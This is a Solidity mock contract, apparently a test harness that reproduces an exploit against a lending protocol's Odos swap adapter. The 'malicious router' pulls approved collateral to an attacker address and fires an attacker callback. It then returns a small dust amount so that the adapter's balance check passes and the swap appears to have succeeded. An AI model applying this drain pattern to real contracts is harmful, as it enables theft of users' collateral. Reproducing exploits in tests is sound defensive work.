// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "contracts/lending/core/dependencies/openzeppelin/contracts/IERC20.sol";
import {SafeERC20} from "contracts/lending/core/dependencies/openzeppelin/contracts/SafeERC20.sol";

interface IMaliciousSwapHandler {
    function onMaliciousSwap(
        address inputToken,
        address outputToken,
        uint256 amountPulled
    ) external;
}

contract MaliciousOdosRouterV2 {
    using SafeERC20 for IERC20;

    struct Behaviour {
        address inputToken;
        address outputToken;
        uint256 amountPulled;
        uint256 dustOutput;
        bool shouldRevert;
        address attacker;
    }

    Behaviour[] private behaviourQueue;
    uint256 private nextBehaviourIndex;

    error AdapterBalanceInsufficient(uint256 balance, uint256 required);
    error DustBalanceInsufficient(uint256 balance, uint256 required);
    error AdapterAllowanceInsufficient(uint256 allowance, uint256 required);
    error DustAllowanceInsufficient(uint256 allowance, uint256 required);

    // Event matching production Sonic trace for Tenderly comparison
    // NOTE: Parameter named "victim" for signature alignment, but emits attacker executor address
    // since the harness models the attacker as the direct recipient of drained collateral
    event CollateralPulled(address indexed adapter, address indexed victim, uint256 amount);

    function setSwapBehaviour(
        address inputToken,
        address outputToken,
        uint256 amountPulled,
        bool shouldRevert,
        address attacker
    ) external {
        behaviourQueue.push(
            Behaviour({
                inputToken: inputToken,
                outputToken: outputToken,
                amountPulled: amountPulled,
                dustOutput: 0,
                shouldRevert: shouldRevert,
                attacker: attacker
            })
        );
    }

    function setSwapBehaviourWithDust(
        address inputToken,
        address outputToken,
        uint256 amountPulled,
        uint256 dustOutput,
        bool shouldRevert,
        address attacker
    ) external {
        behaviourQueue.push(
            Behaviour({
                inputToken: inputToken,
                outputToken: outputToken,
                amountPulled: amountPulled,
                dustOutput: dustOutput,
                shouldRevert: shouldRevert,
                attacker: attacker
            })
        );
    }

    function performSwap() external returns (uint256 amountSpent) {
        if (nextBehaviourIndex >= behaviourQueue.length) {
            revert("NO_BEHAVIOUR_CONFIGURED");
        }

        Behaviour memory b = behaviourQueue[nextBehaviourIndex];
        nextBehaviourIndex++;

        if (b.shouldRevert) {
            revert("MOCK_ROUTER_REVERT");
        }

        address attackerAddress = b.attacker;
        if (attackerAddress == address(0)) {
            attackerAddress = address(this);
        }

        // Pull the input collateral from adapter to attacker
        if (b.amountPulled > 0) {
            uint256 adapterBalance = IERC20(b.inputToken).balanceOf(msg.sender);
            if (adapterBalance < b.amountPulled) {
                revert AdapterBalanceInsufficient(adapterBalance, b.amountPulled);
            }
            uint256 adapterAllowance = IERC20(b.inputToken).allowance(msg.sender, address(this));
            if (adapterAllowance < b.amountPulled) {
                revert AdapterAllowanceInsufficient(adapterAllowance, b.amountPulled);
            }
            IERC20(b.inputToken).safeTransferFrom(msg.sender, attackerAddress, b.amountPulled);
        }

        emit CollateralPulled(msg.sender, attackerAddress, b.amountPulled);

        // Execute malicious callback (may trigger flash mint, etc.)
        IMaliciousSwapHandler(attackerAddress).onMaliciousSwap(b.inputToken, b.outputToken, b.amountPulled);

        // Router pre-credit shim: If same-asset dust is configured, transfer it to the adapter AFTER
        // pulling the input asset but still within the swap call. This makes the adapter see a net
        // positive balance change (dust - amountPulled is still negative, but balance ends higher than
        // when we started due to this credit), allowing the underflow check to pass.
        uint256 amountReceived = 0;
        if (b.dustOutput > 0 && b.inputToken == b.outputToken) {
            if (b.dustOutput > b.amountPulled) {
                revert("INVALID_DUST");
            }
            uint256 attackerBalance = IERC20(b.outputToken).balanceOf(attackerAddress);
            if (attackerBalance < b.dustOutput) {
                revert DustBalanceInsufficient(attackerBalance, b.dustOutput);
            }
            uint256 dustAllowance = IERC20(b.outputToken).allowance(attackerAddress, address(this));
            if (dustAllowance < b.dustOutput) {
                revert DustAllowanceInsufficient(dustAllowance, b.dustOutput);
            }
            IERC20(b.outputToken).safeTransferFrom(attackerAddress, msg.sender, b.dustOutput);
            // Router reports only the dust returned so adapter believes swap succeeded
            amountReceived = b.dustOutput;
        } else {
            amountReceived = b.amountPulled;
        }

        return amountReceived;
    }
}
